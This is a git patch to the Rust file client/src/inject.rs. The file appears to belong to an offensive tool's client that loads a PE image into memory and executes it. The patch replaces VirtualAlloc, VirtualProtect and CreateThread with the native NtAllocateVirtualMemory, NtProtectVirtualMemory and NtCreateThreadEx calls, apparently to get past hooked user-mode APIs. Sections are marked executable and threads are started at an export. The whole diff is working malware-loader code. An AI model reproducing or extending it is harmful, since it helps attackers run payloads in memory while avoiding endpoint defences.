@@ -1,0 +1,133 @@
+From c5f49138d525d0802e94749b119dcb5dfa1de4f5 Mon Sep 17 00:00:00 2001
+From: Ron Panduwana <panduwana@gmail.com>
+Date: Sun, 18 Oct 2026 10:07:18 +0700
+Subject: [PATCH 10/14] using NtCreateThreadEx, NtAllocateVirtualMemory,
+ NtProtectVirtualMemory
+
+---
+ client/src/inject.rs | 81 ++++++++++++++++++++++++++++++++------------
+ 1 file changed, 60 insertions(+), 21 deletions(-)
+
+diff --git a/client/src/inject.rs b/client/src/inject.rs
+index 4431512..1e39406 100644
+--- a/client/src/inject.rs
++++ b/client/src/inject.rs
+@@ -6,9 +6,17 @@ use crate::utils;
+ #[cfg(windows)]
+ use utils::{image_ordinal, image_snap_by_ordinal, DllMain, Main, BaseRelocationEntry, get_peb};
+ #[cfg(windows)]
++use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtProtectVirtualMemory};
++#[cfg(windows)]
++use ntapi::ntpsapi::{NtCreateThreadEx, PPS_ATTRIBUTE_LIST};
++#[cfg(windows)]
++use ntapi::ntobapi::NtClose;
++#[cfg(windows)]
++use ntapi::winapi::shared::ntdef::{HANDLE, NTSTATUS, NT_SUCCESS, NULL};
++#[cfg(windows)]
+ use windows::{
+     core::PCSTR,
+-    Win32::{Foundation::{CloseHandle, FARPROC, HINSTANCE}, 
++    Win32::{Foundation::{FARPROC, HINSTANCE}, 
+     System::{
+         Diagnostics::Debug::*, 
+         LibraryLoader::{GetProcAddress, LoadLibraryA}, 
+@@ -98,14 +106,22 @@ impl PE {
+     }
+ 
+     fn local_pe_exec(&mut self, param: String, export: String) -> Result<(), String> {
+-        let address = unsafe {
+-            VirtualAlloc(
+-                None,
+-                (*self.nt_header).OptionalHeader.SizeOfImage as usize,
++        let mut base_address: *mut c_void = std::ptr::null_mut();
++        let mut region_size = (*self.nt_header).OptionalHeader.SizeOfImage as usize;
++        let status = unsafe {
++            NtAllocateVirtualMemory(
++                -1isize as _,
++                &mut base_address,
++                0,
++                &mut region_size,
+                 MEM_COMMIT | MEM_RESERVE,
+-                PAGE_READWRITE,
++                PAGE_READWRITE.0,
+             )
+         };
++        if !NT_SUCCESS(status) {
++            return Err("[!] Failed to call NtAllocateVirtualMemory".to_string());
++        }
++        let address = base_address;
+ 
+         let mut tmp_section = self.section_header;
+         let mut export_address = null_mut();
+@@ -174,16 +190,30 @@ impl PE {
+                 let _ = func_dll(HINSTANCE(address), DLL_PROCESS_ATTACH, null_mut());
+ 
+                 if !export_address.is_null() {
+-                    let htread = CreateThread(
+-                        None,
++                let mut thread_handle: HANDLE = std::ptr::null_mut();
++                let status = unsafe {
++                    NtCreateThreadEx(
++                        &mut thread_handle,
++                        0x1FFFFF, // THREAD_ALL_ACCESS
++                        std::ptr::null_mut(),
++                        -1isize as _,
++                        export_address,
++                        std::ptr::null_mut(),
++                        0,
+                         0,
+-                        std::mem::transmute(export_address),
+-                        None,
+-                        THREAD_CREATION_FLAGS(0),
+-                        None
+-                    ).expect("[!] Error when calling CreateThread");
++                        0,
++                        0,
++                        std::ptr::null_mut(),
++                    )
++                };
++
++                if !NT_SUCCESS(status) {
++                    panic!("[!] Error when calling NtCreateThreadEx");
++                }
+ 
+-                    CloseHandle(htread).unwrap();
++                unsafe {
++                    NtClose(thread_handle);
++                }
+                 }
+ 
+             } else {
+@@ -344,13 +374,22 @@ impl PE {
+                         protection = PAGE_EXECUTE_READWRITE;
+                 }
+ 
+-                let mut old_protect = PAGE_PROTECTION_FLAGS(0);
+-                VirtualProtect(
+-                    address.offset((*self.section_header).VirtualAddress as isize),
+-                    (*self.section_header).SizeOfRawData as usize, 
+-                    protection, 
+-                    &mut old_protect,
+-                ).expect("Error when calling VirtualProtect");
++                let mut base_addr = address.offset((*self.section_header).VirtualAddress as isize);
++                let mut size = (*self.section_header).SizeOfRawData as usize;
++                let mut old_protect_val = 0u32;
++                
++                let status = unsafe {
++                    NtProtectVirtualMemory(
++                        -1isize as _,
++                        &mut base_addr,
++                        &mut size,
++                        protection.0,
++                        &mut old_protect_val,
++                    )
++                };
++                if !NT_SUCCESS(status) {
++                    panic!("Error when calling NtProtectVirtualMemory");
++                }
+ 
+                 self.section_header = (self.section_header as usize + size_of::<IMAGE_SECTION_HEADER>()) as *mut IMAGE_SECTION_HEADER;
+             }
+-- 
+2.39.5 (Apple Git-154)
+
